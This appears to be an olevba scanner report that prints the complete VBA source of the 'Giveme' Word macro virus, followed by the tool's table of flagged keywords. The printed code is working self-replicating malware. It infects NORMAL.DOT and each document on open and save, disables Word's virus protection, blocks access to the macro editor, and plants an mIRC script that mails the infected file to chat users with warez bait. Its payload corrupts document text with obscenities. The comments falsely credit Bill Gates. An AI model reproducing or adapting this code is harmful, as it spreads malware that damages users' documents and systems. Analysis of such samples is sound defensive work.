olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Giveme-848b641cc7c38acc5f9a27111d68f79cf34b4328
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Giveme-848b641cc7c38acc5f9a27111d68f79cf34b4328 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Microsoft.bas 
in file: Virus.MSWord.Giveme-848b641cc7c38acc5f9a27111d68f79cf34b4328 - OLE stream: 'Macros/VBA/Microsoft'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Macro virus made by Microsoft Company.
'Author: Bill Gates (yeah, it's really me!).
'
'Bill Gates have to confess:
'"I was the one who did the Melissa virus! I'm sorry for the trouble I may have caused you."
'"The guy David Smith is innocent!"

Sub SetMeUp()
Dim Path As String, D1 As String, D2 As String, D3 As String, _
D4 As String, D5 As String, D6 As String, Docu As String, _
Hell As String

'Stealth
Call HideMe

On Error GoTo Aha
Close #1

'Check if mIRC worm is installed
Open "c:\go.sex" For Input As #1
Input #1, Path
Close #1
If Path = "No fucking mIRC!" Then GoTo WhatTheHell
Open Path & "giveme.doc" For Input As #1
Close #1
Open Path & "script.ini" For Input As #1
Input #1, D1, D2, D3, D4, D5, D6
Close #1
If D1 <> "[script]" Or D2 <> "n0=on 1:JOIN:#:{" Or D3 <> "n1=/msg $nick Hi $nick! Please read the file I'm sending to you. You will get warez" Or D4 <> "mp3 and XXX passwords FOR FREE!" Or D5 <> "n2=/send $nick " & Path & "giveme.doc" Or D6 <> "n3=}" Then GoTo Aha
'MsgBox "mIRC worm already installed.", vbInformation
Exit Sub

Aha:
Resume GoGo

GoGo:
On Error GoTo WhatTheHell
Close #1
StatusBar = "Loading..."

If LCase(Dir("c:\mirc\mirc32.exe")) = "mirc32.exe" Then
    Path = "c:\mirc\"
Else
    With Application.FileSearch
        .NewSearch
        .LookIn = "c:\"
        .SearchSubFolders = True
        .FileName = "mirc32.exe"
        .MatchTextExactly = True
        .FileType = msoFileTypeAllFiles
        .Execute
        
        Hell = 0
        'No fucking mIRC!
        If .FoundFiles.Count = 0 Then Hell = 1
        If Dir(.FoundFiles(1)) = "" Then Hell = 1
        If LCase(Right(.FoundFiles(1), 10)) <> "mirc32.exe" Then Hell = 1
        If Left(Right(.FoundFiles(1), 11), 1) <> "\" Then Hell = 1
        
        If Hell = 1 Then
            'Stupid idiot! Doesn't everyone have mIRC?
            Path = "No fucking mIRC!"
            GoTo SavePath
        Else
            'mIRC path
            Path = Left(.FoundFiles(1), Len(.FoundFiles(1)) - 10)
        End If
    End With
End If

Docu = ActiveDocument.FullName

'No fucking write-protect!
If LCase(Dir(Path & "giveme.doc")) = "giveme.doc" Then _
SetAttr Path & "giveme.doc", vbNormal
'Copy infected file to mIRC directory
ActiveDocument.SaveAs Path & "giveme.doc", wdFormatTemplate

'No fucking write-protect!
SetAttr Docu, vbNormal
'Save the document
ActiveDocument.SaveAs Docu, wdFormatTemplate

'Write-protected files sucks so hard!
If LCase(Dir(Path & "script.ini")) = "script.ini" Then _
SetAttr Path & "script.ini", vbNormal
'Create mIRC worm
Open Path & "script.ini" For Output As #1
Print #1, "[script]"
Print #1, "n0=on 1:JOIN:#:{"
Print #1, "n1=/msg $nick Hi $nick! Please read the file I'm sending to you. You will get warez, mp3 and XXX passwords FOR FREE!"
Print #1, "n2=/send $nick " & Path & "giveme.doc"
Print #1, "n3=}"
Close #1

SavePath:
'Yep, I still hate those fucking write-protected files!
If LCase(Dir("c:\go.sex")) = "go.sex" Then _
SetAttr "c:\go.sex", vbNormal
'Save the mIRC path
Open "c:\go.sex" For Output As #1
Print #1, Path
Close #1

Exit Sub

WhatTheHell:
'MsgBox "No mIRC found.", vbInformation
Close #1
Exit Sub
End Sub

Sub HideMe()
On Error Resume Next

'Stealth
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros = 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.SavePropertiesPrompt = False
Options.ConfirmConversions = False
SetAttr NormalTemplate.FullName, vbNormal
End Sub

Sub AutoExec()
'Stealth
Call HideMe
End Sub

Sub AutoOpen()
'Stealth
Call HideMe

'No bugs in Bill's code! No, no...
On Error Resume Next

'Even if I hate write-protected files, I'm not gonna infect them
If Not GetAttr(ActiveDocument.FullName) = vbNormal And _
Not GetAttr(ActiveDocument.FullName) = vbArchive Then Exit Sub

'Document check
If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
    'Save the document as a template
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate
    'Call infection routine
    Call ASDF

    'Install mIRC worm
    Call SetMeUp
End If
End Sub

Sub FileSaveAs()
'Stealth
Call HideMe

'No bugs in Bill's code! No, no...
On Error Resume Next

'Show Save As dialog box
Dialogs(wdDialogFileSaveAs).Show

'Document check
If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
    'Only save the document if the user doesn't press the stupid Cancel key
    If InStr(1, ActiveDocument.FullName, "ument", vbTextCompare) <= 0 Then
        'Save the document as a template
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate
        'Call infection routine
        Call ASDF
    End If
End If
End Sub

Sub FileSave()
'Stealth
Call HideMe

'No bugs in Bill's code! No, no...
On Error Resume Next

'Document check
If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
    'Call infection routine
    Call ASDF
End If
End Sub

Sub ASDF()
'Stealth
Call HideMe

'No bugs in Bill's code! No, no...
On Error Resume Next

'Check if NORMAL.DOT is infected
Billy = 0
YeahYeah = WordBasic.CountMacros(0, 0)
For vir = 1 To YeahYeah
    If WordBasic.[MacroName$](vir, 0, 0) = "Microsoft" Then
        'NORMAL.DOT is already infected!
        Billy = 666
    End If
Next vir

'Infecting NORMAL.DOT
If Not Billy = 666 Then
    'MsgBox "Infecting NORMAL.DOT!", vbInformation
    SetAttr NormalTemplate.FullName, vbNormal
    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Microsoft", wdOrganizerObjectProjectItems
    NormalTemplate.Save
End If

'Check if the document is infected
Billy = 0
YeahYeah = WordBasic.CountMacros(1, 0)
For vir = 1 To YeahYeah
    If WordBasic.[MacroName$](vir, 1, 0) = "Microsoft" Then
        'Document is already infected!
        Billy = 666
    End If
Next vir

'Infecting the document
If Not Billy = 666 Then
    'MsgBox "Infecting your file...", vbInformation
    Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "Microsoft", wdOrganizerObjectProjectItems
End If

'Payload
Call PayMe

'Save the document
ActiveDocument.Save
End Sub

Function yx() As String
Dim xy As Integer

'Stealth
Call HideMe

Randomize
xy = Int(Rnd * 20) + 1
If xy = 1 Then yx = "oh yeah! "
If xy = 2 Then yx = "yeah yeah! "
If xy = 3 Then yx = "what the hell! "
If xy = 4 Then yx = "don't do that to me! "
If xy = 5 Then yx = "I love you! "
If xy = 6 Then yx = "shit happens all the time! "
If xy = 7 Then yx = "oh no - not again! "
If xy = 8 Then yx = "fucking lamer! "
If xy = 9 Then yx = "please fuck with me! "
If xy = 10 Then yx = "fuck you! "
If xy = 11 Then yx = "suck my ass! "
If xy = 12 Then yx = "yep - it sucks! "
If xy = 13 Then yx = "who am I? "
If xy = 14 Then yx = "why am I doing this? "
If xy = 15 Then yx = "is this really happening to me? "
If xy = 16 Then yx = "I know I'm a loser! "
If xy = 17 Then yx = "please don't kill me, I'm not a virus! "
If xy = 18 Then yx = "ha ha - funny, isn't it?! "
If xy = 19 Then yx = "ugh ugh! "
If xy = 20 Then yx = "Am I a virus? No, I'm Bill Gates and I live in your PC! "
End Function

Sub PayMe()
Dim BG As Integer

'Stealth
Call HideMe

Randomize
BG = Int(Rnd * 10) + 1
If BG < 1 Or BG > 1 Then Exit Sub

Do While InStr(1, ActiveDocument.Content, ". ") > 0
    Selection.WholeStory
    Selection.Find.Text = ". "
    
    Selection.Find.Replacement.Text = ", " & yx
    Selection.Find.Execute Replace:=wdReplaceOne
Loop

Selection.HomeKey Unit:=wdStory, Extend:=wdMove
End Sub

Sub Stealth()
'Stealth
Call HideMe

MsgBox "Can't find necessary files.", vbCritical
End Sub

Sub ToolsMacro()
Call Stealth
End Sub

Sub ToolsCustomize()
Call Stealth
End Sub

Sub FileTemplates()
Call Stealth
End Sub

Sub ViewVBCode()
Call Stealth
End Sub

Sub FormatStyle()
Call Stealth
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |mirc32.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

